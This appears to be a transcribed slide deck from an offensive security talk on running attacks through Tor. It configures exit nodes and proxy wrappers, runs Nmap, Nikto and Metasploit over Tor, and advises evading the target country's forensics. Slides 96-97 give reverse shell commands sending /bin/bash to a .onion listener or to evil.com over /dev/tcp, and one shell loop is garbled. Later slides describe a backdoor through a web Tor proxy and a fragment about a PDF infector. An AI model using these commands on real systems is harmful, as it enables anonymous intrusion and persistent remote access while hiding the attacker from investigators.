### Slide 75: Button, button, who's got the button
- **When using Tor, the exit node is typically random.**
- **It is possible to define a specific exit node or a group of exit nodes.**
- **This is useful for accessing content that is blocked by country.**
- **It also helps in covering tracks and hiding within the Tor network.**
- **Avoid using an exit node in the target country when possible, as the target country can collect the node for forensics.**

### Slide 76: Where am I again?
- **Theoretically, you can specify a country code in the `torrc` file.**
- **However, this method often does not work correctly and is documented as unreliable in many news groups.**
- **It is useful to pop out of just one or two nodes when running scans and similar activities.**
- **Configurations can be easily changed, and you can have multiple configurations with different exit nodes, which can be periodically switched.**

### Slide 77: Who's who
- **Vidalia is a user-friendly tool for managing Tor. Here, we are looking at potential Tor exit nodes.**

### Slide 78: Who's who
- **Selecting Nodes Through Vidalia:**
  - **Ensure that the selected exit nodes have unique names.**
  - **Commonly, "Unnamed" is a common node name and should be avoided.**
  - **Create a new configuration file for Tor and add the following lines:**
    ```plaintext
    ExitNodes list,of,nodes
    StrictExitNodes 1
    ```

### Slide 79: Who's who
- **There are web pages that provide Tor nodes, such as [TorStatus](https://torstatus.blutmagie.de/).**
- **On this site, you can click on a node to retrieve its fingerprint.**
  - **Add a dollar sign to the front and remove spaces to use it as a Tor exit node.**
  - **For example:**
    ```plaintext
    Unnamed: 46D0 5072 0DE9 D59E 6C22 D970 453B E287 C03F CE9B
    $46D050720DE9D59E6C22D970453BE287C03FCE9B
    ```
- **Note that not all nodes may be active at any given time, so it is advisable to select multiple nodes.**
- **Even unnamed nodes will work fine; the names do not matter.**

### Slide 80: [TorStatus](https://torstatus.blutmagie.de/)

### Slide 81: Who's who
- **In Vidalia, you must point to the new configuration file:**
  1. **Stop Tor.**
  2. **Open settings.**
  3. **Go to Advanced and point to the new configuration file.**

### Slide 82: What do I have?
- **Privoxy:**
  - **HTTP Proxy on port 8118 (by default).**
  - **Cleans or denies pages that may unintentionally reveal private IP addresses when viewed in a browser.**
  - **Commonly configured to talk to Tor's SOCKS proxy.**
- **Tor:**
  - **Full SOCKS 5 proxy on port 9050.**
- **Vidalia:**
  - **GUI interface to control Tor.**

### Slide 83: It'll fit
- **With some creative patchwork, almost any TCP connection can go over Tor.**
- **Key Linux programs that make Tor more useful include:**
  - **Proxychains**
  - **torsocks**
  - **Tsocks**
- **These programs hook the socket calls of a program and send them over the proxy.**
- **Always use IP addresses instead of DNS to avoid potential leaks.**
- **Never run these tools as root, as root has higher privileges.**
- **If one tool fails, try another.**

### Slide 84: I want to proxy
- **Setting up Proxychains:**
  - **In `/etc/proxychains.conf`:**
    - **Comment out `random_chain`, `chain_len`, and example proxies.**
    - **Uncomment or add `dynamic_chain`.**
    - **Add a SOCKS 5 proxy for Tor:**
      ```plaintext
      socks5  127.0.0.1 9050
      ```
    - **Adjust `tcp_read_time_out` and `tcp_connect_time_out` as needed.**
      - **Larger values increase the likelihood of successful connections but may cause other issues like slow scans or false positives.**

### Slide 85: I want to proxy
- **Setting up Tsocks:**
  - **In `/etc/tsocks.conf`, ensure the following lines are correct:**
    ```plaintext
    Server = 127.0.0.1  # TOR host, usually local
    server_type = 5     # Socks4/5, usually 5
    server_port = 9050  # tor port, default 9050
    ```

### Slide 86: I want to proxy
- **Torsocks:**
  - **Set up automatically when built from source.**
  - **A Tor-friendly replacement for Tsocks.**

### Slide 87: Let's give'r a go
- **Let's try Nmap over Tor:**
  - **Timeouts can be problematic.**
  - **Different exit nodes have different policies, which may stop parts of the scan.**
  - **Results may be less accurate but provide a good starting point.**
  - **Requires significant time and tweaking, but it can be better than physically traveling to another country.**
  - **Do not run UDP, name lookup, ping, or any scans requiring root.**

### Slide 88: Let's give'r a go
- **Example:**
  ```bash
  user@user-laptop:~/tor_rc$ proxychains nmap -n -PN -p 80,22,443 192.1.167.74
  Starting Nmap 4.76 (http://nmap.org) at 2009-05-25 09:41 MDT

  ...

  80/tcp open  http    Apache httpd
  Service Info: OS: Linux
  ```

### Slide 89: Let's give'r a go

### Slide 90: Let's get a bit deeper
- **Running Nikto over Tor:**
  - **Nikto has a proxy option, but it is a full HTTP proxy, not a SOCKS proxy.**
  - **This can be used with Privoxy, but Privoxy may interfere with results, making them less useful.**
  - **Running Nikto over Tsocks works much better.**

### Slide 91: Let's get a bit deeper
- **Example:**
  ```bash
  user@user-laptop:~/$ proxychains nikto -host blog.attackresearch.com 192.1.167.74
  - Nikto v2.03/2.04

### Slide 92: What the heck, I'll eat the whole cow
- **Consider a TCP-based VPN like PPTP at a remote site.**
- **With creative combinations of port redirection and Tsocks/Proxychains, you can set up a VPN over Tor.**
  - **This setup is not very reliable and timeouts can kill the connection.**
  - **Using `tcpxd` on one host, you can set up:**
    ```bash
    tsocks tcpxd 1723 ip.of.target 1723
    ```
  - **Now, have a second machine PPTP into the first.**

### Slide 93: Metasploit and Tor
- **Options for using Metasploit with Tor:**
  - **Use Torsocks.**
  - **Alternatively, configure Metasploit:**
    ```bash
    setg Proxies SOCKS4:localhost:9050
    ```
  - **Both methods are restricted to Connect Shells and TCP.**
  - **Always use IP addresses to avoid unintended leakage.**

### Slide 94: Demo

### Slide 95: Can they call me anonymously?
- **Tor uses `.onion` domains for anonymous communication within the Tor network.**
- **Normally, both sides need Tor installed.**
- **Can you shell to a `.onion`?**
  - **Yes, through Tsocks, Privoxy, or even `wget`.**
- **Can you determine the country of a `.onion`?**
  - **Currently, no. While there have been past issues, they are quickly patched.**

### Slide 96: Shelling Bash Over Tor
- **Tor is installed on the target with Torsocks:**
  - **Simplest case: a netcat listener and using built-in bash commands.**
  - **Setting up the server:**
    - **In the `torrc` file, add:**
      ```plaintext
      HiddenServiceDir /my/service/dir/
      HiddenServicePort  127.0.0.1:port
      ```
    - **Start netcat:**
      ```bash
      nc -l -p port
      ```

### Slide 97: Shelling Bash Over Tor
- **On the target:**
  - **With Netcat:**
    ```bash
    torsocks nc -e /bin/bash .onion:port
    ```
    - **`.onion` is in the server's service directory in a file called `hostname`.**
  - **Without Netcat:**
    ```bash
    torsocks /bin/bash
    exec 5<>/dev/tcp/evil.com/8080
    cat <&5 >&5; done
    ```

### Slide 98: Do I have to install Tor on the target?
- **No, there are web proxies that provide access to the Tor network, such as [Tor-Proxy](https://www.tor-proxy.net/).**
- **Keep in mind that these proxies see all traffic but won't know the server's location.**
- **Example URL:**
  ```plaintext
  http://tor-proxy.net/proxy/tor/browse.php?u=http%3A%2F%2Fslashdot.org%2F&b=14
  ```
- **We have created Proof-of-Concept shells using this method, essentially a modified HTTP/HTTPS Shell.**

### Slide 99: The tor-proxy.net Backdoor
- **Benefits:**
  - **No need for Tor on the client.**
  - **Cannot determine the server's owner.**
  - **Supports HTTPS.**
- **Downfalls:**
  - **Tor-Proxy.net can read all traffic.**
  - **Asynchronous, with potential delays in command output.**
  - **Not interactive.**

### Slide 100: DEMO

  - **Autogenerates the applet & meterpreter.**
  - **Integrates with PDF infector module.**
